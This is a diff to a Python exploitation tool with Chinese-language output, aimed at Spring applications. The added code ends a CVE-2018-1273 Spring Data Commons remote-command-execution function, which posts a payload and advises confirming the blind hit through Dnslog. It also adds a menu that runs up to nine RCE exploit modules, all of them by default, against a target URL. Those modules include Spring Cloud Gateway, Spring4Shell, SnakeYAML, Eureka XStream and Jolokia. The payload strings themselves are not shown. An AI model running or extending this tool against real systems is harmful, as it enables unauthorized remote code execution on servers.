@@ -432,3 +432,49 @@ def CVE_2018_1273(url, proxies, header_new):
                     sys.exit(0)
                 else:
                     re2 = requests.post(url=urltest2, data=payload3, headers=Headers, verify=False, proxies=proxies)
+                    code2 = re2.status_code
+                    if (int(code2) != 503):
+                        cprint('[+] 该Payload已经打出，由于该漏洞无回显，请用Dnslog进行测试\n', "red")
+        else:
+            cprint("[-] 未发现Spring_Data_Commons远程命令执行漏洞\n", "yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
+def vul(url, proxies, header_new):
+    functions = {
+        1: JeeSpring_2023,
+        2: CVE_2022_22947,
+        3: CVE_2022_22963,
+        4: CVE_2022_22965,
+        5: CVE_2021_21234,
+        6: SnakeYAML_RCE,
+        7: Eureka_xstream_RCE,
+        8: JolokiaRCE,
+        9: CVE_2018_1273,
+    }
+    cprint("[+] 目前漏洞库内容如下：","green")
+    for num, func in functions.items():
+        print(f" {num}: {func.__name__}")
+    try:
+        choices = input("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
+        if choices == '':
+            choices = "1,2,3,4,5,6,7,8,9"
+        choices = [int(choice) for choice in choices.split(',')]
+    except Exception as e:
+        print("请不要输入无意义的字符串")
+        sys.exit()
+    for choice in choices:
+        selected_func = functions.get(choice)
+        if selected_func:
+            selected_func(url, proxies, header_new)
+        else:
+            print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
+            break
+    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
+    sys.exit()
